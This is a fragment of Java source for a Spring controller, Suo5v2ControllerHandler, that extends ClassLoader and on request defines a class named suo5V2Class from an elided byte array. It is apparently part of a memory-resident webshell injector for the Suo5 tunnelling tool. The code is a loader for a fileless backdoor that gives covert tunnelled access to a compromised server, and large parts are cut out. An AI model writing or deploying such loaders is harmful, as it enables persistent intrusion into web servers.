 ...
 * @since 2025/12/9
 */
public class Suo5v2ControllerHandler extends ClassLoader implements Controller {
    ...
    protected Suo5v2ControllerHandler(ClassLoader parent) {
        super(parent);
    }
    ...
    public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception {
        try {
            if (suo5V2Class == null) {
                ...
                suo5V2Class = new Suo5v2ControllerHandler(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
            }
